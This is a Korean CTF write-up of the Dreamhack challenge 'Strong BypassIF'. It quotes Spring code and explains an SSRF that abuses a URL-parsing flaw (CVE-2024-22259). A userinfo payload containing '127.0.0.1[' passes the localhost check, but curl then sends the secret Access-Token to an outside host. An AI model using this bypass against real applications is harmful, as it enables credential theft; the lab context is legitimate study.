# Strong BypassIF
https://dreamhack.io/wargame/challenges/1637

## Description
Access /api/flag to get the flag.

## Exploit

### TestApi
```java
@RestController
@RequestMapping("/api")
public class TestApi {

    @Value("${flag}")
    private String flag;

    @GetMapping("/flag")
    public ResponseEntity<Map<String, String>> getFlag(@RequestHeader(value="Access-Token", required=true) String accessToken){
        Map<String, String> response = new HashMap<>();
        if (accessToken == null || accessToken.isEmpty()){
            response.put("result", "fail");
            response.put("message", "Unauthorized");
            return ResponseEntity.status(403).body(response);
        }
        if (!accessToken.equals("[**REDACTED**]")){
            System.out.println(accessToken);
            response.put("result", "fail");
            response.put("message", "Access token is not Valid");
            return ResponseEntity.status(400).body(response);
        }
        response.put("result", "success");
        response.put("message", flag);
        return ResponseEntity.ok(response);
    }
```
해당 코드를 보면 엑세스 토큰이 지정된 값과 같으면 flag를 얻을 수 있다. 엑세스 토큰은 `application.properties`에 저장되어 있다.

### ApiTestController
```java
        // 프로토콜 검사
        if (!scheme.equals("http") && !scheme.equals("https")) {
            model.addAttribute("message", "Only http or https.");
            model.addAttribute("url", null);
            return "reqResult";
        }

        // 사용자 정보 검사 ?/#@
        if (containsInvalidCharacters(userInfo)) {
            model.addAttribute("message", "The input contains invalid characters.");
            model.addAttribute("url", null);
            return "reqResult";
        }

        // 공백 제거
        userInfo = userInfo.replaceAll("\\s+", "");

        // 호스트 검사 127.0.0.1 localhost
        if (containsInvalidCharacters(host)) {
            model.addAttribute("message", "The host contains invalid characters.");
            model.addAttribute("url", null);
            return "reqResult";
        }

        // 호스트 공백 제거
        host = host.replaceAll("\\s+", "");

        // path 수정
        if (!path.startsWith("/")) path = '/' + path;
        path = path.replaceAll("\\s+", "");

        // ?유저인포
        if (!userInfo.isEmpty()) {
            url = scheme + "://" + userInfo + "@" + host + path;
        } else {
            url = scheme + "://" + host + path;
        }

        // url = scheme + "://" + userInfo + "@" + host + path;
        // url = http://userinfo@host/path
```
url을 생성하기 위해 여러 조건들이 존재한다.
1. 프로토콜: http, https
2. userinfo에 `?/#@` 해당 문자열 있으면 차단
3. host `127.0.0.1, localhost` 만 허용

각각의 조건을 통과할때마다 변수에 값을 할당하고, 모든 조건을 통과하면 `url = scheme + "://" + userInfo + "@" + host + path;`로 url을 생성한다.

---

```java
        String parsed_host = UriComponentsBuilder.fromHttpUrl(URLDecoder.decode(url)).build().getHost();  // 여기에 127.0.0.1을 넣어야함
        System.out.println(parsed_host);
        if (Arrays.asList(ALLOWED_HOSTS).contains(parsed_host)) {
            try {
                String[] cmd = {"curl", "-H", "Access-Token: " + accessToken, "-s", url};  // curl 요청 토큰 비공개
                Process p = Runtime.getRuntime().exec(cmd);  // 프로세스 실행
                BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));  // 결과 저장
                String line;
                StringBuilder sb = new StringBuilder();
                while ((line = stdInput.readLine()) != null) {
                    sb.append(line);
                }
                p.waitFor();  // 프로세스 완료 대기
                if (sb.toString().contains("DH{")){  // DH{ 있으면 플래그 볼 수 없습니다 메시지
                    model.addAttribute("message", "You can't see the flag");
                    model.addAttribute("url", url);
                    return "reqResult";
                }
                model.addAttribute("message", sb.toString());
                model.addAttribute("url", url);
                return "reqResult";

            } catch (IOException | InterruptedException e) {
                throw new RuntimeException(e);
            }
        }else{
            model.addAttribute("message", "Not allowed to access this URL.");
            model.addAttribute("url", url);
            return "reqResult";
        }
    }
}
```
이 코드에선 먼저 url을 파싱해서 parsed_host를 얻는다.     
그 후 host가 ALLOWED_HOSTS에 있으면 curl 명령어를 통해서 요청을 발송하고, 아니면 실패를 반환한다.

해당 로직을 사용해서 ssrf를 이용해 공격하면 된다.   
url을 조작해서 나의 서버로 요청을 보내 access token을 탈취하고 해당 토큰과 함깨 /api/flag에 요청을 보내면 flag를 얻을 수 있다.

해당 서비스의 스프링부트 버전은 6.1.4를 사용하고 있다.    
6.1.4에 존재하는 cve는 많이 있는데, 그 중 CVE-2024-22259 open redirect를 이용했다.     
22259는 22243을 패치한 후 뒷 버전에서 발생한 취약점인데 새로운 poc를 찾아서 공격하는 문제이다. ejs 문제와 비슷한 것 같다.     
22243: https://spring.io/security/cve-2024-22243   
22259: https://spring.io/security/cve-2024-22259

https://github.com/SeanPesce/CVE-2024-22243   

https://github.com/spring-projects/spring-framework/commit/1d2b55e670bcdaa19086f6af9a5cec31dd0390f0#diff-b7ee321c4c2864dd3493c171d139fc498e11de4ef18cfc57dee3c6f5a84e3dc7L81

```
userinfo: qwer:qwer@127.0.0.1[
host: host.com
path: /
```
`url: https://qwer:qwer@127.0.0.1[@host.com/`     
서버에서는 host를 127.0.0.1로 파싱하지만 실제 호스트는 host.com이 되어서 host.com으로 토큰을 담고 요청을 보내게 된다.
해당 토큰을 이용해서 /api/flag로 요청을 보내면 플래그를 얻을 수 있다.